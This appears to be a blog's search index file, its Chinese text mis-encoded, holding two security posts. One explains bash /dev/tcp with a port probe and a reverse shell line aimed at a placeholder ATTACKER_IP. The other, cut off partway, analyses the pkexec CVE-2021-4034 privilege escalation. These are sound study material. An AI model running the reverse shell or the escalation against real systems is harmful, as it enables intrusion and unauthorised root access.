<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>/dev/tcp/...æ–‡ä»¶åˆ†æ</title>
    <link href="/2025/06/24/dev-tcp-%E6%96%87%E4%BB%B6%E5%88%86%E6%9E%90/"/>
    <url>/2025/06/24/dev-tcp-%E6%96%87%E4%BB%B6%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<p>åœ¨ Linux&#x2F;Unix çš„ä¸–ç•Œé‡Œï¼Œ&quot;ä¸€åˆ‡çš†æ–‡ä»¶&quot; (Everything is a file)ã€‚è¿™ä¸ªå“²å­¦æ€æƒ³æ„å‘³ç€ä½ å¯ä»¥ç”¨ç›¸åŒçš„å‘½ä»¤å’Œæ“ä½œï¼ˆå¦‚ <code>cat</code>, <code>echo</code>, <code>read</code>, é‡å®šå‘ <code>&lt;</code> å’Œ <code>&gt;</code>) æ¥å¤„ç†ä¸åŒç±»å‹çš„ I&#x2F;Oï¼Œæ— è®ºæ˜¯çœŸæ­£çš„æ–‡ä»¶ã€ç¡¬ä»¶è®¾å¤‡è¿˜æ˜¯è¿›ç¨‹ã€‚</p><p><code>/dev/tcp/...</code> è¿™ä¸ªç‰¹æ€§æ­£æ˜¯è¿™ç§æ€æƒ³çš„å»¶ä¼¸ã€‚<code>bash</code> è®©ä½ èƒ½å¤Ÿå°†ä¸€ä¸ª TCP ç½‘ç»œè¿æ¥<strong>ä¼ªè£…</strong>æˆä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦ã€‚å½“ä½ å°è¯•å¯¹è¿™ä¸ªâ€œæ–‡ä»¶â€è¿›è¡Œè¯»æˆ–å†™æ“ä½œæ—¶ï¼Œ<code>bash</code> ä¼šåœ¨åå°ä¸ºä½ å®Œæˆä»¥ä¸‹å·¥ä½œï¼š</p><ol><li>åˆ›å»ºä¸€ä¸ª TCP å¥—æ¥å­—ï¼ˆSocketï¼‰ã€‚</li><li>æ ¹æ®ä½ æä¾›çš„ <code>ip</code> å’Œ <code>port</code> å‘èµ·ä¸€ä¸ªç½‘ç»œè¿æ¥ã€‚</li><li>å°†è¿™ä¸ªè¿æ¥ä¸ä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦å…³è”èµ·æ¥ã€‚</li></ol><p>è¿™æ ·ï¼Œä½ å°±å¯ä»¥<mark>ç”¨æœ€åŸºç¡€çš„ Shell å‘½ä»¤æ¥å®ç°ç½‘ç»œé€šä¿¡</mark>ï¼Œè€Œ<strong>æ— éœ€è°ƒç”¨å¤–éƒ¨ç¨‹åº</strong>ï¼Œå¦‚ <code>netcat (nc)</code>ã€<code>telnet</code> æˆ– <code>curl</code>ã€‚</p><p>è¿™ä¸ªåŠŸèƒ½çš„æ ¸å¿ƒæ˜¯<strong>é‡å®šå‘ (Redirection)</strong>ã€‚</p><h2 id="ç«¯å£æ‰«æ-æ¢æµ‹"><a href="#ç«¯å£æ‰«æ-æ¢æµ‹" class="headerlink" title="ç«¯å£æ‰«æ&#x2F;æ¢æµ‹"></a>ç«¯å£æ‰«æ&#x2F;æ¢æµ‹</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># å°è¯•è¿æ¥åˆ° www.google.com çš„ 80 ç«¯å£</span><br>(<span class="hljs-built_in">echo</span> &gt; /dev/tcp/www.google.com/80) &amp;&gt;/dev/null<br></code></pre></td></tr></table></figure><p>dev_tcp_scan.sh</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br><br>HOST=<span class="hljs-string">&quot;www.baidu.com&quot;</span><br>PORT=<span class="hljs-string">&quot;80&quot;</span><br><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;æ­£åœ¨æ£€æŸ¥ä¸»æœº <span class="hljs-variable">$HOST</span> çš„ç«¯å£ <span class="hljs-variable">$PORT</span>...&quot;</span><br><br><span class="hljs-comment"># è¶…æ—¶è®¾ç½®ï¼ˆå¯é€‰ï¼Œä½†æ¨èï¼‰</span><br><span class="hljs-built_in">timeout</span> 1 bash -c <span class="hljs-string">&quot;(echo &gt; /dev/tcp/<span class="hljs-variable">$HOST</span>/<span class="hljs-variable">$PORT</span>) &amp;&gt;/dev/null&quot;</span><br><br><span class="hljs-keyword">if</span> [ $? -eq 0 ]; <span class="hljs-keyword">then</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;æˆåŠŸï¼šç«¯å£ <span class="hljs-variable">$PORT</span> æ˜¯å¼€æ”¾çš„ã€‚&quot;</span><br><span class="hljs-keyword">else</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;å¤±è´¥ï¼šç«¯å£ <span class="hljs-variable">$PORT</span> æ˜¯å…³é—­çš„æˆ–ä¸»æœºä¸å¯è¾¾ã€‚&quot;</span><br><span class="hljs-keyword">fi</span><br><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">â”Œâ”€â”€â”€(c0r3dump@MacBook-Air)-[~/Works/tempdir]<br>â””â”€$ ./dev_tcp_scan.sh<br>æ­£åœ¨æ£€æŸ¥ä¸»æœº www.google.com çš„ç«¯å£ 80...<br>å¤±è´¥ï¼šç«¯å£ 80 æ˜¯å…³é—­çš„æˆ–ä¸»æœºä¸å¯è¾¾ã€‚<br>â”Œâ”€â”€â”€(c0r3dump@MacBook-Air)-[~/Works/tempdir]<br>â””â”€$ ./dev_tcp_scan.sh<br>æ­£åœ¨æ£€æŸ¥ä¸»æœº www.baidu.com çš„ç«¯å£ 80...<br>æˆåŠŸï¼šç«¯å£ 80 æ˜¯å¼€æ”¾çš„ã€‚<br></code></pre></td></tr></table></figure><h2 id="HTTPè¯·æ±‚"><a href="#HTTPè¯·æ±‚" class="headerlink" title="HTTPè¯·æ±‚"></a>HTTPè¯·æ±‚</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br><br><span class="hljs-comment"># ä½¿ç”¨ exec å°†æ–‡ä»¶æè¿°ç¬¦3ä¸ä¸€ä¸ªåˆ° a.cn çš„80ç«¯å£çš„TCPè¿æ¥å…³è”</span><br><span class="hljs-comment"># &lt;&gt; è¡¨ç¤ºå¯è¯»å¯å†™</span><br><span class="hljs-built_in">exec</span> 3&lt;&gt;/dev/tcp/cn.bing.com/80<br><br><span class="hljs-comment"># é€šè¿‡æ–‡ä»¶æè¿°ç¬¦3å‘é€ä¸€ä¸ª HTTP GET è¯·æ±‚</span><br><span class="hljs-comment"># -e è®© echo èƒ½å¤Ÿè§£æ \n æ¢è¡Œç¬¦</span><br><span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;GET / HTTP/1.1\nHost: cn.bing.com\n\n&quot;</span> &gt;&amp;3<br><br><span class="hljs-comment"># ä»æ–‡ä»¶æè¿°ç¬¦3è¯»å–å¹¶æ‰“å°æœåŠ¡å™¨çš„å“åº”</span><br><span class="hljs-built_in">cat</span> &lt;&amp;3<br><br><span class="hljs-comment"># å…³é—­æ–‡ä»¶æè¿°ç¬¦</span><br><span class="hljs-built_in">exec</span> 3&lt;&amp;-<br><br></code></pre></td></tr></table></figure><p><img src="./image-20250624204251531.png" alt="image-20250624204251531"></p><h2 id="Reverse-Shell"><a href="#Reverse-Shell" class="headerlink" title="Reverse Shell"></a>Reverse Shell</h2><ul><li><a href="https://www.ddosi.org/reverse-shell/#Bash%E5%8F%8D%E5%90%91Shell">åå‘shellå¤‡å¿˜å•|Reverse Shell Cheat Sheet - ğŸ”°é›¨è‹â„’ğŸ”°</a></li></ul><p>ä¸ºäº†ç»•è¿‡é˜²ç«å¢™çš„é™åˆ¶ï¼Œåå‘ Shell åº”è¿è€Œç”Ÿã€‚å®ƒæŠŠè¿æ¥çš„æ–¹å‘å®Œå…¨é¢ å€’äº†è¿‡æ¥ã€‚</p><ol><li><strong>æ”»å‡»è€…æœºå™¨ (æœåŠ¡å™¨ç«¯)</strong>ï¼šåœ¨è‡ªå·±çš„å…¬ç½‘æœåŠ¡å™¨ä¸Šè¿è¡Œä¸€ä¸ªç¨‹åºï¼Œç›‘å¬åœ¨æŸä¸ªç«¯å£ä¸Šï¼ˆæ¯”å¦‚ <code>4444</code>ï¼‰ï¼Œç­‰å¾…â€œçŒç‰©â€ä¸Šé’©ã€‚</li><li><strong>å—å®³è€…æœºå™¨ (å®¢æˆ·ç«¯)</strong>ï¼šä¸»åŠ¨æ‰§è¡Œä¸€ä¸ªå‘½ä»¤ï¼Œ<strong>ä»å†…éƒ¨å‘èµ·è¿æ¥</strong>ï¼Œå»è¿æ¥æ”»å‡»è€…æœºå™¨çš„ <code>IP:4444</code>ã€‚</li><li>ä¸€æ—¦è¿æ¥æˆåŠŸï¼Œå—å®³è€…æœºå™¨å°±æŠŠæœ¬åœ°çš„ Shellï¼ˆ<code>/bin/bash</code>ï¼‰çš„è¾“å…¥è¾“å‡ºï¼Œå…¨éƒ¨äº¤ç»™äº†è¿™ä¸ªä¸»åŠ¨å»ºç«‹çš„è¿æ¥ã€‚</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># -i äº¤äº’å¼</span><br><span class="hljs-comment"># &gt;&amp; é‡å®šå‘ï¼Œstdout stderrå®šå‘åˆ°/dev/tcp/ATTACKER_IP/PORT</span><br><span class="hljs-comment"># 0&gt;&amp;1 stdinå®šå‘åˆ°/dev/tcp/ATTACKER_IP/PORTä¸­</span><br>bash -i &gt;&amp; /dev/tcp/ATTACKER_IP/PORT 0&gt;&amp;1<br><br></code></pre></td></tr></table></figure><p><img src="./image-20250624210840315.png" alt="image-20250624210840315"></p>]]></content>
    
    
    
    <tags>
      
      <tag>Linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linuxææƒcve-2021-4034æ¼æ´åˆ†æ</title>
    <link href="/2025/02/19/Linux%E6%8F%90%E6%9D%83cve-2021-4034%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <url>/2025/02/19/Linux%E6%8F%90%E6%9D%83cve-2021-4034%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h2 id="æ¼æ´èƒŒæ™¯"><a href="#æ¼æ´èƒŒæ™¯" class="headerlink" title="æ¼æ´èƒŒæ™¯"></a>æ¼æ´èƒŒæ™¯</h2><p>Qualyså‘ç°äº†<code>polkit&#39;s pkexec</code>ä¸­å­˜åœ¨çš„ä¸€ä¸ªæœ¬åœ°ææƒæ¼æ´ï¼Œpolkitæ˜¯ä¸€ä¸ªSUID-rootç¨‹åºï¼Œè¢«é»˜è®¤å®‰è£…åœ¨å¤§å¤šæ•°çš„Linuxå‘è¡Œç‰ˆä¸­ã€‚</p><blockquote><p><strong>Polkit</strong>ï¼ˆä»¥å‰ç§°ä¸º <strong>PolicyKit</strong>ï¼‰æ˜¯ä¸€ä¸ªç”¨äºåœ¨ç±» Unix æ“ä½œç³»ç»Ÿä¸­å®šä¹‰å’Œç®¡ç†æƒé™çš„å·¥å…·åŒ…ã€‚å®ƒæä¾›äº†ä¸€ç§çµæ´»ä¸”ç»†ç²’åº¦çš„æ–¹å¼ï¼Œå…è®¸éç‰¹æƒè¿›ç¨‹æ‰§è¡Œé€šå¸¸éœ€è¦ rootï¼ˆç®¡ç†å‘˜ï¼‰æƒé™çš„æ“ä½œã€‚Polkit åœ¨ Linux ç³»ç»Ÿä¸­å¹¿æ³›ä½¿ç”¨ï¼Œç”¨äºè®©æ™®é€šç”¨æˆ·æˆ–è¿›ç¨‹æ‰§è¡Œéœ€è¦ç‰¹æƒçš„æ“ä½œï¼Œè€Œæ— éœ€ç›´æ¥èµ‹äºˆå®Œæ•´çš„ root æƒé™ã€‚</p><p><strong>pkexec</strong> æ˜¯ Polkit æä¾›çš„ä¸€ä¸ªå‘½ä»¤è¡Œå·¥å…·ï¼Œå…è®¸æ™®é€šç”¨æˆ·ä»¥å¦ä¸€ä¸ªç”¨æˆ·ï¼ˆé€šå¸¸æ˜¯ rootï¼‰çš„èº«ä»½æ‰§è¡Œå‘½ä»¤ï¼Œå¹¶é€šè¿‡ Polkit è¿›è¡Œæˆæƒã€‚å®ƒæ˜¯ Polkit æ¡†æ¶çš„ä¸€éƒ¨åˆ†ï¼Œæ—¨åœ¨æä¾›ä¸€ç§å®‰å…¨çš„æ–¹å¼æ¥æ‰§è¡Œéœ€è¦ç‰¹æƒçš„æ“ä½œï¼Œè€Œæ— éœ€ç›´æ¥åˆ‡æ¢åˆ° root ç”¨æˆ·æˆ–ä½¿ç”¨ <code>sudo</code>ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">pkexec is a sudo-like, SUID-root program, described as follows by its<br>man page:<br><br>------------------------------------------------------------------------<br>NAME<br>       pkexec - Execute a <span class="hljs-built_in">command</span> as another user<br><br>SYNOPSIS<br>       pkexec [--version] [--disable-internal-agent] [--<span class="hljs-built_in">help</span>]<br><br>       pkexec [--user username] PROGRAM [ARGUMENTS...]<br><br>DESCRIPTION<br>       pkexec allows an authorized user to execute PROGRAM as another<br>       user. If PROGRAM is not specified, the default shell will be run.<br>       If username is not specified, <span class="hljs-keyword">then</span> the program will be executed<br>       as the administrative super user, root.<br></code></pre></td></tr></table></figure></blockquote><h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><p>main()å‡½æ•°å†…å­˜å¸ƒå±€</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">æ ˆé¡¶ï¼ˆä½åœ°å€ï¼‰<br>+-------------------+<br>| argc              |  // å‚æ•°æ•°é‡<br>+-------------------+<br>| argv[0]           |  // æŒ‡å‘ç¨‹åºåç§°çš„æŒ‡é’ˆ<br>| argv[1]           |  // æŒ‡å‘ç¬¬ä¸€ä¸ªå‚æ•°çš„æŒ‡é’ˆ<br>| ...               |<br>| argv[argc-1]      |  // æŒ‡å‘æœ€åä¸€ä¸ªå‚æ•°çš„æŒ‡é’ˆ<br>| NULL              |  // argvæ•°ç»„çš„ç»“æŸæ ‡å¿—<br>+-------------------+<br>| envp[0]           |  // æŒ‡å‘ç¬¬ä¸€ä¸ªç¯å¢ƒå˜é‡çš„æŒ‡é’ˆ<br>| envp[1]           |  // æŒ‡å‘ç¬¬äºŒä¸ªç¯å¢ƒå˜é‡çš„æŒ‡é’ˆ<br>| ...               |<br>| NULL              |  // envpæ•°ç»„çš„ç»“æŸæ ‡å¿—<br>+-------------------+<br>| å‚æ•°å­—ç¬¦ä¸²         |  // ä¾‹å¦‚ <span class="hljs-string">&quot;program_name&quot;</span>, <span class="hljs-string">&quot;arg1&quot;</span>, <span class="hljs-string">&quot;arg2&quot;</span><br>| ç¯å¢ƒå˜é‡å­—ç¬¦ä¸²     |  // ä¾‹å¦‚ <span class="hljs-string">&quot;PATH=/usr/bin&quot;</span>, <span class="hljs-string">&quot;HOME=/home/user&quot;</span><br>+-------------------+<br>æ ˆåº•ï¼ˆé«˜åœ°å€ï¼‰<br></code></pre></td></tr></table></figure><p>pkexec&#39;s main()</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// ...</span><br><span class="hljs-comment">// 534   for (n = 1; n &lt; (guint) argc; n++)</span><br><span class="hljs-comment">//  535     &#123;</span><br><span class="hljs-comment">//  ...</span><br><span class="hljs-comment">// 568     &#125;</span><br>  g_assert (argv[argc] == <span class="hljs-literal">NULL</span>);<br>  path = g_strdup (argv[n]);<br><span class="hljs-comment">// ...</span><br><br><span class="hljs-comment">// ä¿®æ”¹envp</span><br>  <span class="hljs-keyword">if</span> (path[<span class="hljs-number">0</span>] != <span class="hljs-string">&#x27;/&#x27;</span>)<br>    &#123;<br>      <span class="hljs-comment">/* g_find_program_in_path() is not suspectible to attacks via the environment */</span><br>      s = g_find_program_in_path (path);<br>      <span class="hljs-keyword">if</span> (s == <span class="hljs-literal">NULL</span>)<br>        &#123;<br>          g_printerr (<span class="hljs-string">&quot;Cannot run program %s: %s\n&quot;</span>, path, strerror (ENOENT));<br>          <span class="hljs-keyword">goto</span> out;<br>        &#125;<br>      g_free (path);<br>      argv[n] = path = s;<br>    &#125;<br><br><span class="hljs-comment">//  657   for (n = 0; environment_variables_to_save[n] != NULL; n++)</span><br><span class="hljs-comment">//  658     &#123;</span><br><span class="hljs-comment">//  659       const gchar *key = environment_variables_to_save[n];</span><br><span class="hljs-comment">//  ...</span><br><span class="hljs-comment">//  662       value = g_getenv (key);</span><br><span class="hljs-comment">//  ...</span><br><span class="hljs-comment">//  670       if (!validate_environment_variable (key, value))</span><br><span class="hljs-comment">//  ...</span><br><span class="hljs-comment">//  675     &#125;</span><br><span class="hljs-comment">//  ...</span><br><span class="hljs-comment">// 702   if (clearenv () != 0)</span><br></code></pre></td></tr></table></figure><blockquote><ul><li><code>g_find_program_in_path</code> æ˜¯ GLib åº“ä¸­çš„ä¸€ä¸ªå‡½æ•°ï¼Œç”¨äºåœ¨ç³»ç»Ÿçš„ PATH ç¯å¢ƒå˜é‡ä¸­æŸ¥æ‰¾å¯æ‰§è¡Œæ–‡ä»¶çš„ç»å¯¹è·¯å¾„ã€‚å¦‚æœ <code>path</code> ä¸æ˜¯ç»å¯¹è·¯å¾„ï¼ˆå³ä¸ä»¥ <code>/</code> å¼€å¤´ï¼‰ï¼Œ<code>g_find_program_in_path()</code> ä¼šåœ¨ <code>PATH</code> ç¯å¢ƒå˜é‡æŒ‡å®šçš„ç›®å½•ä¸­æœç´¢åä¸º <code>path</code> çš„å¯æ‰§è¡Œæ–‡ä»¶ã€‚</li><li><code>envp</code> æ•°ç»„åŒ…å«äº†å½“å‰è¿›ç¨‹çš„ç¯å¢ƒå˜é‡ï¼Œæ¯ä¸ªå…ƒç´ æ˜¯ä¸€ä¸ªä»¥ <code>key=value</code> æ ¼å¼å­˜å‚¨çš„å­—ç¬¦ä¸²ã€‚</li></ul></blockquote><p>å¯ä»¥çœ‹åˆ°</p><ul><li><code>path = g_strdup (argv[n]);</code>ï¼Œpathæ¥è‡ªäº<code>argv[n]</code></li><li>nä»1å¼€å§‹åˆå§‹åŒ–ï¼Œå¦‚æœargc &#x3D; 0ï¼Œnå°±ä¸º1ï¼Œpath &#x3D; argv[1]ï¼Œé€ æˆäº†è¶Šç•Œè¯»ï¼ˆæ­¤æ—¶argv[] &#x3D; {NULL}ï¼Œå³path &#x3D; argv[1] &#x3D; envp[0]ï¼‰</li><li>è€Œ<code>argv[1] = path = s</code>åˆé€ æˆäº†è¶Šç•Œå†™ï¼Œå°†envp[0]ç¯¡æ”¹äº†</li></ul><p>å¦‚ä¸Šå°±æ˜¯æˆ‘ä»¬çš„æ¼æ´åˆ©ç”¨åŸè¯­ï¼šoob read &amp;&amp; oob write</p><h3 id="å¦‚ä½•è§¦å‘"><a href="#å¦‚ä½•è§¦å‘" class="headerlink" title="å¦‚ä½•è§¦å‘"></a>å¦‚ä½•è§¦å‘</h3><p>ä»ä¸Šé¢çš„æ¼æ´åˆ©ç”¨åŸè¯­ï¼Œæ›´è¿›ä¸€æ­¥å¯ä»¥çŸ¥é“</p><ul><li>å¦‚æœç¯å¢ƒå˜é‡<code>PATH=name</code>ï¼Œå¹¶ä¸”<code>name</code>ç›®å½•å­˜åœ¨çš„è¯ï¼Œé‚£ä¹ˆå°±ä¼šå»åœ¨nameç›®å½•ä¸‹å»æœç´¢åä¸º<code>argv[1]/envp[0]</code>çš„å¯æ‰§è¡Œæ–‡ä»¶</li><li>æ­¤æ—¶<code>name/value</code>å°±ä¼šè¦†ç›–<code>envp[0]</code>ï¼ˆå³å¯ä»¥é‡æ–°å¼•å…¥ä¸å®‰å…¨çš„ç¯å¢ƒå˜é‡ï¼Œå¦‚ä¸‹ã€‚è¿™äº›ç¯å¢ƒå˜é‡é»˜è®¤è¢«ld.soç§»é™¤äº†ï¼‰</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash">/* Environment variable to be removed <span class="hljs-keyword">for</span> SUID programs.  The names are<br>   all stuffed <span class="hljs-keyword">in</span> a single string <span class="hljs-built_in">which</span> means they have to be terminated<br>   with a <span class="hljs-string">&#x27;\0&#x27;</span> explicitly.  */<br><span class="hljs-comment">#define UNSECURE_ENVVARS \</span><br>  <span class="hljs-string">&quot;GCONV_PATH\0&quot;</span>                                                              \<br>  <span class="hljs-string">&quot;GETCONF_DIR\0&quot;</span>                                                             \<br>  <span class="hljs-string">&quot;GLIBC_TUNABLES\0&quot;</span>                                                          \<br>  <span class="hljs-string">&quot;HOSTALIASES\0&quot;</span>                                                             \<br>  <span class="hljs-string">&quot;LD_AUDIT\0&quot;</span>                                                                \<br>  <span class="hljs-string">&quot;LD_BIND_NOT\0&quot;</span>                                                             \<br>  <span class="hljs-string">&quot;LD_BIND_NOW\0&quot;</span>                                                             \<br>  <span class="hljs-string">&quot;LD_DEBUG\0&quot;</span>                                                                \<br>  <span class="hljs-string">&quot;LD_DEBUG_OUTPUT\0&quot;</span>                                                         \<br>  <span class="hljs-string">&quot;LD_DYNAMIC_WEAK\0&quot;</span>                                                         \<br>  <span class="hljs-string">&quot;LD_HWCAP_MASK\0&quot;</span>                                                           \<br>  <span class="hljs-string">&quot;LD_LIBRARY_PATH\0&quot;</span>                                                         \<br>  <span class="hljs-string">&quot;LD_ORIGIN_PATH\0&quot;</span>                                                          \<br>  <span class="hljs-string">&quot;LD_PRELOAD\0&quot;</span>                                                              \<br>  <span class="hljs-string">&quot;LD_PROFILE\0&quot;</span>                                                              \<br>  <span class="hljs-string">&quot;LD_SHOW_AUXV\0&quot;</span>                                                            \<br>  <span class="hljs-string">&quot;LD_VERBOSE\0&quot;</span>                                                              \<br><br></code></pre></td></tr></table></figure><h3 id="å¼•å…¥å±é™©çš„ç¯å¢ƒå˜é‡"><a href="#å¼•å…¥å±é™©çš„ç¯å¢ƒå˜é‡" class="headerlink" title="å¼•å…¥å±é™©çš„ç¯å¢ƒå˜é‡"></a>å¼•å…¥å±é™©çš„ç¯å¢ƒå˜é‡</h3><p>åœ¨<code>if(clearenv() != 0</code>ä¸­ï¼Œä¼šæ¸…é™¤æ‰€æœ‰çš„ç¯å¢ƒå˜é‡ã€‚æ‰€ä»¥å°±éœ€è¦å¯ä»¥æ‰¾åˆ°è§¦å‘çš„æ—¶æœºï¼Œåˆ°åº•å¼•å…¥å“ªä¸€ä¸ªç¯å¢ƒå˜é‡å°±å¾ˆé‡è¦ã€‚åœ¨<code>clearenv()</code>ä¹‹å‰ï¼Œè§‚å¯Ÿåˆ°äº†å¦‚ä¸‹æ“ä½œ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">------------------------------------------------------------------------<br>  88 log_message (gint     level,<br>  89              gboolean print_to_stderr,<br>  90              const    gchar *format,<br>  91              ...)<br>  92 &#123;<br> ...<br> 125   <span class="hljs-keyword">if</span> (print_to_stderr)<br> 126     g_printerr (<span class="hljs-string">&quot;%s\n&quot;</span>, s);<br>------------------------------------------------------------------------<br> 383 validate_environment_variable (const gchar *key,<br> 384                                const gchar *value)<br> 385 &#123;<br> ...<br> 406           log_message (LOG_CRIT, TRUE,<br> 407                        <span class="hljs-string">&quot;The value for the SHELL variable was not found the /etc/shells file&quot;</span>);<br> 408           g_printerr (<span class="hljs-string">&quot;\n&quot;</span><br> 409                       <span class="hljs-string">&quot;This incident has been reported.\n&quot;</span>);<br>------------------------------------------------------------------------<br></code></pre></td></tr></table></figure><p>g_printerr çš„å…³é”®</p><ul><li>é»˜è®¤æƒ…å†µä¸‹ä¼šæ‰“å°<code>UTF-8</code>çš„é”™è¯¯æ¶ˆæ¯ç±»å‹</li><li>å¦‚æœä¸æ˜¯<code>UTF-8</code>ç±»å‹ï¼Œé‚£ä¹ˆä¼šè°ƒç”¨<code>iconv_open()</code>è¿›è¡Œå­—ç¬¦é›†è½¬æ¢<ul><li><code>iconv_open()</code>ä¼šæ‰§è¡Œä¸€ä¸ªsoåº“ï¼Œè¯¥é…ç½®æ–‡ä»¶è·¯å¾„å¯ä»¥ç”±<code>GCONV_PATH</code>è¿›è¡Œå®šä¹‰ï¼Œé»˜è®¤é…ç½®æ–‡ä»¶è·¯å¾„ä¸º<code>/usr/lib/gconv/gconv-modules</code></li></ul></li></ul><blockquote><p><code>g_printerr</code> å‡½æ•°æ˜¯ GLib åº“ä¸­çš„ä¸€ä¸ªå‡½æ•°ï¼Œç”¨äºæ‰“å°é”™è¯¯ä¿¡æ¯åˆ°æ ‡å‡†é”™è¯¯è¾“å‡º (<code>stderr</code>)ã€‚GLib æ˜¯ä¸€ä¸ªåº•å±‚çš„é€šç”¨åº“ï¼Œæä¾›äº†è®¸å¤šæœ‰ç”¨çš„æ•°æ®ç»“æ„å’Œå‡½æ•°ï¼Œå¹¿ æ³›ç”¨äº GNOME é¡¹ç›®å’Œå…¶ä»– Linux åº”ç”¨ç¨‹åºã€‚</p><p><code>gconv</code> æ˜¯ GNU å­—ç¬¦é›†è½¬æ¢åº“ï¼Œå®ƒæä¾›äº†ä¸€ç»„å‡½æ•°ï¼Œç”¨äºåœ¨ä¸åŒçš„å­—ç¬¦é›†ä¹‹é—´è¿›è¡Œè½¬æ¢ã€‚å½“ç¨‹åºéœ€è¦è¿›è¡Œå­—ç¬¦é›†è½¬æ¢æ—¶ï¼Œå®ƒä¼šè°ƒç”¨ <code>gconv</code> åº“ä¸­çš„å‡½æ•°ã€‚<code>gconv</code> åº“ä¼šæ ¹æ® <code>CHARSET</code> ç¯å¢ƒå˜é‡æ¥ç¡®å®šå½“å‰ç³»ç»Ÿçš„å­—ç¬¦é›†ï¼Œå¹¶æ ¹æ®éœ€è¦åŠ è½½ç›¸åº”çš„å­—ç¬¦é›†è½¬æ¢æ¨¡å—ã€‚</p><p><strong>GCONV_PATH 